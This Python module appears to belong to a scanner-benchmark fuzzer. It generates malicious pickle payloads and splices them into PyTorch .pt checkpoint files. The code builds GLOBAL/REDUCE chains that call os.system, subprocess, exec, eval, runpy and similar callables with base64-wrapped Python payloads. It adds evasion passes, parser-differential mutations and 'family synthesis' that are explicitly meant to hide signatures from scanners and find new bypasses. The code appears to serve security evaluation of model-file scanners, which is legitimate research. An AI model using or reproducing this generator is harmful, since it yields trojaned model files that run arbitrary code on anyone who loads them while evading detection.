"""T3.3 — Implement Candidate Generator Core.

Combines opcode taxonomy, dangerous-callable registry, and metadata/buffer
sampling to produce syntactically valid malicious pickle candidates.
"""

from __future__ import annotations

import os
import pickle
import random
import struct
import base64
import tempfile
import uuid
from typing import Any

from pipeline.opcodes import parse_pickle, OPCODES_BY_BYTE, OPCODES_BY_NAME, OpcodeCategory, OpcodeClassification
from pipeline.registry import get_armable_entries, is_dangerous
from pipeline.templates import inject_payload_into_torch
from pipeline.differential import differential_mutate


def _structurally_sane(pkl_bytes: bytes) -> bool:
    """Reject stream-fusion artifacts before they reach scanners.

    A well-formed single-object pickle has at most one PROTO header (leading)
    and exactly one terminal STOP. Metadata mutation over stacked/fused
    content can produce mid-stream ``\\x80`` headers whose bodies then
    desynchronize operand parsing downstream (split find_class operands,
    swallowed delimiters). Those candidates can never load; catching them
    here lets callers resample instead of burning scan budget.
    """
    try:
        parsed = parse_pickle(pkl_bytes)
    except Exception:
        return False
    if not parsed or parsed[-1][0].name != "STOP":
        return False
    if sum(1 for op, _ in parsed if op.name == "STOP") != 1:
        return False
    proto_positions = [i for i, (op, _a) in enumerate(parsed) if op.name == "PROTO"]
    if proto_positions and (len(proto_positions) > 1 or proto_positions[0] != 0):
        return False
    frame_positions = [i for i, (op, _a) in enumerate(parsed) if op.name == "FRAME"]
    if frame_positions and frame_positions != [1]:
        return False
    return True


class CandidateGenerator:
    """Fuzzer candidate generator implementing PickleFuzzer mutation and injection."""

    def __init__(self):
        # Sample values for metadata mutation
        self.sample_strings = [
            "benign", "fuzzed", "", "A" * 10, "A" * 256,
            "admin", "root", "127.0.0.1", "localhost",
        ]
        self.sample_ints = [0, 1, -1, 127, 255, 32767, 65535, 2147483647, -2147483648]
        self.sample_floats = [0.0, 1.0, -1.0, 3.14159, 1e-5, float("inf"), float("-inf"), float("nan")]

    def _mutate_argument(self, op: OpcodeClassification, arg: bytes) -> bytes:
        """Mutate an argument's metadata depending on the opcode classification."""
        if op.category == OpcodeCategory.NO_ARG:
            return b""
            
        try:
            # 1. Mutate Length-Prefixed Strings/Bytes
            if op.category == OpcodeCategory.LENGTH_PREFIXED:
                # Determine new payload
                new_payload = random.choice(self.sample_strings).encode("utf-8")
                length = len(new_payload)
                
                # Format prefix depending on width
                if op.arg_width == 1:
                    prefix = bytes([min(length, 255)])
                    new_payload = new_payload[:255]
                elif op.arg_width == 4:
                    prefix = struct.pack("<I", length)
                elif op.arg_width == 8:
                    prefix = struct.pack("<Q", length)
                else:
                    return arg
                return prefix + new_payload

            # 2. Mutate Fixed-Arg Integers/Floats
            if op.category == OpcodeCategory.FIXED_ARG:
                assert op.arg_width is not None
                if op.name == "BINFLOAT" and op.arg_width == 8:
                    val = random.choice(self.sample_floats)
                    return struct.pack(">d", val)  # BINFLOAT is big-endian
                elif op.name == "BININT" and op.arg_width == 4:
                    val = random.choice(self.sample_ints)
                    return struct.pack("<i", val)
                elif op.name == "BININT1" and op.arg_width == 1:
                    val = random.randint(0, 255)
                    return bytes([val])
                elif op.name == "BININT2" and op.arg_width == 2:
                    val = random.randint(0, 65535)
                    return struct.pack("<H", val)
                return arg

            # 3. Mutate Delimited Literals
            if op.category == OpcodeCategory.DELIMITED:
                # Do not mutate GLOBAL/INST paths to avoid breaking structural imports
                if op.name in ("GLOBAL", "INST"):
                    return arg
                    
                if op.name in ("INT", "LONG"):
                    val = random.choice(self.sample_ints)
                    return f"{val}\n".encode("ascii")
                elif op.name == "FLOAT":
                    val = random.choice(self.sample_floats)
                    return f"{val}\n".encode("ascii")
                elif op.name in ("STRING", "UNICODE"):
                    val = random.choice(self.sample_strings)
                    # Pickle representation format requires quotes and newline
                    return f"'{val}'\n".encode("utf-8")
        except Exception:
            pass
            
        return arg

    def mutate_pickle_bytes(
        self,
        pkl_bytes: bytes,
        payload_code: str,
        dangerous_callable: tuple[str, str] | None = None,
        mutate_meta: bool = True,
        mutation_prob: float = 0.15,
    ) -> bytes:
        """Parse, mutate metadata of, and inject a dangerous payload into a pickle stream."""
        parsed = parse_pickle(pkl_bytes)
        
        # 1. Mutate existing metadata (PickleFuzzer metadata/buffer sampling)
        mutated_parsed = []
        for op, arg in parsed:
            if op.name == "STOP":
                continue  # Skip STOP until we assemble the final stream
                
            if mutate_meta and random.random() < mutation_prob:
                new_arg = self._mutate_argument(op, arg)
                mutated_parsed.append((op, new_arg))
            else:
                mutated_parsed.append((op, arg))

        # 2. Curate and select a dangerous callable
        if dangerous_callable is None:
            entries = get_armable_entries()
            if not entries:
                raise ValueError("Dangerous callable registry is empty")
            entry = random.choice(entries)
            module, name = entry.module, entry.name
        else:
            module, name = dangerous_callable

        # 3. Build the malicious injection chunk dynamically based on callable arguments
        injection_parts = []
        
        # c<module>\n<name>\n
        injection_parts.append(OPCODES_BY_NAME["GLOBAL"].code)
        injection_parts.append(f"{module}\n{name}\n".encode("latin1"))
        
        # Generate fuzzed arguments tuple matching the callable.
        # expr_payload is evaluated as a *Python expression* (builtins.eval,
        # pandas.eval, sympy.sympify), so the trigger code is base64-encoded to
        # avoid quote-collision SyntaxErrors: payload_code always contains
        # single quotes (e.g. open('/tmp/...','w')), which would otherwise
        # terminate the enclosing string literal.
        _encoded_payload = base64.b64encode(payload_code.encode("utf-8")).decode("ascii")
        _shell_cmd = f'python3 -c "import base64;exec(base64.b64decode({_encoded_payload!r}))"'
        expr_payload = f"__import__('os').popen({_shell_cmd!r}).read()"
        if module == "subprocess" and name in ("Popen", "run", "call", "check_call", "check_output"):
            args = (("python3", "-c", payload_code),)
        elif module == "subprocess" and name in ("getstatusoutput", "getoutput"):
            args = (f"python3 -c {payload_code!r}",)
        elif name == "system" and module in ("os", "posix", "nt", "IPython.utils.process"):
            args = (f"python3 -c {payload_code!r}",)
        elif module == "runpy" and name == "run_path":
            # Write the payload to a unique per-candidate file (host /tmp is
            # mounted at container /tmp by the validity oracle). A shared file
            # would be overwritten by later candidates, so every run_path
            # candidate would execute the last one written.
            path = os.path.join(
                tempfile.gettempdir(),
                f"regenbench_payload_{os.getpid()}_{uuid.uuid4().hex}.py",
            )
            try:
                with open(path, "w") as f:
                    f.write(payload_code)
            except OSError:
                pass
            args = (path,)
        elif module == "builtins" and name == "exec":
            args = (payload_code,)
        elif module == "builtins" and name == "eval":
            args = (expr_payload,)
        elif module == "pandas" and name == "eval":
            args = (expr_payload,)
        elif module == "sympy" and name == "sympify":
            args = (expr_payload,)
        elif module == "numpy.testing._private.utils" and name == "runstring":
            args = (payload_code, {})
        elif module == "posix" and name == "execv":
            # execv(path, argv): run python3 with -c so the payload executes.
            args = ("/usr/bin/env", ("python3", "-c", payload_code))
        elif module == "runpy" and name == "run_module":
            # run_module(name) cannot execute arbitrary inline code via a module
            # name; skip these candidates entirely so validity stays meaningful.
            raise ValueError(f"unsupported callable for inline payload: {module}.{name}")
        else:
            args = (payload_code,)
            
        args_bytes = pickle.dumps(args, protocol=2)[2:-1]  # Strip PROTO and STOP
        injection_parts.append(args_bytes)
        injection_parts.append(OPCODES_BY_NAME["REDUCE"].code)
        
        # 0 (POP returned result from stack to maintain stack stability)
        injection_parts.append(OPCODES_BY_NAME["POP"].code)
        
        injection_bytes = b"".join(injection_parts)

        # Reconstruct the stream, inserting the malicious chunk right before STOP
        rebuilt_parts = [op.code + arg for op, arg in mutated_parsed]
        rebuilt_parts.append(injection_bytes)
        rebuilt_parts.append(OPCODES_BY_NAME["STOP"].code)

        rebuilt_bytes = b"".join(rebuilt_parts)
        if len(rebuilt_bytes) > 11 and rebuilt_bytes[0] == 0x80 and rebuilt_bytes[2] == 0x95:
            body_len = len(rebuilt_bytes) - 11
            rebuilt_bytes = rebuilt_bytes[:3] + struct.pack("<Q", body_len) + rebuilt_bytes[11:]
        return rebuilt_bytes

    def generate_candidate_pt(
        self,
        benign_pt_bytes: bytes,
        payload_code: str,
        dangerous_callable: tuple[str, str] | None = None,
        mutate_meta: bool = True,
        mutation_prob: float = 0.15,
        op_swap_prob: float = 0.0,
        callable_sub_prob: float = 0.0,
        arg_fuzz_prob: float = 0.0,
        stack_prob: float = 0.0,
        attack_family: str = "gadget",
        evasion_strategies: list[str] | None = None,
        injection_transport: str | None = None,
        differential_prob: float = 0.0,
        family_synthesis_prob: float = 0.0,
    ) -> bytes:
        """Inject a mutated pickle payload into a PyTorch checkpoint file.

        All feedback-controlled mutation parameters alter the embedded pickle:

        * ``op_swap_prob`` / ``arg_fuzz_prob`` are applied to a benign base
          state-dict via :class:`pipeline.mutators.PickleMutator` before payload
          injection, so they produce real byte variation while mostly
          preserving structural validity (unlike the old code, which mutated an
          empty ``{}`` whose opcodes could never change).
        * ``callable_sub_prob`` re-rolls the injected dangerous callable.
        * ``stack_prob`` appends an independent trailing pickle after the
          payload's STOP (torch.load reads the first object and ignores it).
        * ``attack_family`` selects the seed attack family (Phase 1 element 1):
          ``"gadget"`` (default) is the dangerous-callable GLOBAL/REDUCE
          injection; ``"overwritten"`` / ``"pypi_injected"`` / ``"external"``
          build a self-contained ShadowPickle-family stream via
          :mod:`pipeline.templates` (see ``FAMILY_LABELS``); ``"indirect_chain"``
          resolves the sink through a benign builtins chain (Phase 1 stealth).
        * ``evasion_strategies`` (Phase 1) names post-processing strategies
          from :mod:`pipeline.evasion` applied to the malicious stream before
          torch injection, hiding static signatures while preserving execution.
          When active, the torch injection transport defaults to ``splice``
          (raw opcode splice, no ``_pickle.loads`` wrapper) instead of the
          legacy loads-wrap; override with ``injection_transport``.
        * ``differential_prob`` (Phase 3a) applies cross-parser disagreement
          mutations that exploit differences between standard pickle and
          cloudpickle parsers, producing stealthy variants.
        * ``family_synthesis_prob`` (Phase 3b) combines structural signatures
          from a donor ShadowPickle family into the target family's stream,
          exploring the (family1 × family2) product space for novel bypasses.

        Raises ``ValueError`` when the callable cannot carry an inline payload
        (e.g. ``runpy.run_module``) or when mutation produces an unparseable
        stream; callers resample.
        """
        import tempfile

        from pipeline.mutators import PickleMutator
        from pipeline.templates import family_template

        # A benign model-like base so the mutation operators have real
        # structure to operate on while staying torch-loadable as a dict.
        base_benign = {
            "model": {
                "transformer.wte.weight": [1.0, 2.0],
                "transformer.wpe.weight": [3.0, 4.0],
            },
            "model_config": {"vocab_size": 50257, "n_embd": 768, "n_layer": 12},
            "optimizer": {"lr": 1e-5, "beta": 0.9},
            "training_config": {"fp16": False, "use_cache": True, "gradient_checkpointing": None},
            "epoch": 1,
            "random_seed": 42,
            "note": "regenbench benign seed",
        }
        base_pkl = pickle.dumps(base_benign, protocol=5)

        # Phase-3 mutation operators (coverage/feedback-controlled).
        mutator = PickleMutator()
        base_pkl = mutator.mutate(
            base_pkl,
            op_swap_prob=op_swap_prob,
            callable_sub_prob=0.0,  # handled below, on the injected callable
            arg_fuzz_prob=arg_fuzz_prob,
            stack_prob=0.0,  # stacking is appended after injection instead
            family_synthesis_prob=family_synthesis_prob,
            target_family=attack_family,
            donor_family="overwritten" if attack_family != "overwritten" else "pypi_injected",
        )

        # Phase-3a: Differential pickle-parser mutation (cross-parser disagreements)
        if differential_prob and random.random() < differential_prob:
            diff_variants = differential_mutate(base_pkl, max_mutations=10)
            if diff_variants:
                base_pkl = random.choice(diff_variants)

        # Callable substitution: re-roll the injected dangerous callable.
        # Non-armable entries (runpy.run_module, pandas.eval, sympy.sympify,
        # yaml.unsafe_load) cannot carry the inline payload and are excluded.
        if callable_sub_prob and dangerous_callable is not None and random.random() < callable_sub_prob:
            entries = get_armable_entries()
            alternatives = [
                e for e in entries
                if (e.module, e.name) != dangerous_callable
            ]
            if alternatives:
                entry = random.choice(alternatives)
                dangerous_callable = (entry.module, entry.name)

        # Metadata mutation + payload injection into the mutated base.
        if attack_family == "gadget":
            malicious_pkl = self.mutate_pickle_bytes(
                pkl_bytes=base_pkl,
                payload_code=payload_code,
                dangerous_callable=dangerous_callable,
                mutate_meta=mutate_meta,
                mutation_prob=mutation_prob,
            )
        else:
            # ShadowPickle-family stream: a self-contained malicious pickle
            # whose trigger (exec/system/runstring) fires the payload side
            # effect. Metadata mutation is intentionally not applied -- the
            # template stream is the attack itself.
            template = family_template(attack_family)
            if template is None:
                raise ValueError(f"unknown attack_family: {attack_family}")
            malicious_pkl = template.generate_pickle_payload(payload_code)

        # Phase-1 evasion pipeline: hide static signatures post-construction
        # (strategies preserve execution semantics; see tests/test_evasion.py).
        if evasion_strategies:
            from pipeline.evasion import apply_pipeline
            malicious_pkl = apply_pipeline(malicious_pkl, evasion_strategies)

        # Self-check BEFORE the stacking trailer: fused/corrupt streams waste
        # scan budget (they can never load); resample metadata mutation a
        # bounded number of times before giving up so callers see a clean
        # ValueError. The trailer itself is pickle.dumps output and is exempt.
        for _attempt in range(3):
            if _structurally_sane(malicious_pkl):
                break
            if attack_family != "gadget":
                break  # template families are deterministic; retry won't help
            malicious_pkl = self.mutate_pickle_bytes(
                pkl_bytes=base_pkl,
                payload_code=payload_code,
                dangerous_callable=dangerous_callable,
                mutate_meta=mutate_meta,
                mutation_prob=mutation_prob,
            )
            if evasion_strategies:
                from pipeline.evasion import apply_pipeline
                malicious_pkl = apply_pipeline(malicious_pkl, evasion_strategies)
        else:
            raise ValueError("candidate generation produced structurally "
                             "invalid stream after retries")

        # Structural stacking: an independent trailing pickle after the payload's
        # STOP. torch.load returns the first object and ignores the trailer, so
        # validity and payload execution are preserved.
        if stack_prob and random.random() < stack_prob:
            malicious_pkl += pickle.dumps({"fuzzed_stack_payload": True}, protocol=5)

        # Write input bytes to temporary file
        with tempfile.NamedTemporaryFile(suffix=".pt", delete=False) as f_in:
            f_in.write(benign_pt_bytes)
            in_path = f_in.name
            
        out_path = in_path + ".out.pt"

        # Transport choice: explicit arg wins; otherwise splice whenever the
        # evasion pipeline is active so the legacy loads-wrap signature
        # (global:_pickle.loads) never re-introduces detection.
        transport = injection_transport or ("splice" if evasion_strategies else "loads")

        try:
            inject_payload_into_torch(in_path, out_path, malicious_pkl,
                                      transport=transport)
            with open(out_path, "rb") as f_out:
                result_bytes = f_out.read()
        finally:
            try:
                os.remove(in_path)
            except OSError:
                pass
            try:
                os.remove(out_path)
            except OSError:
                pass
                
        return result_bytes
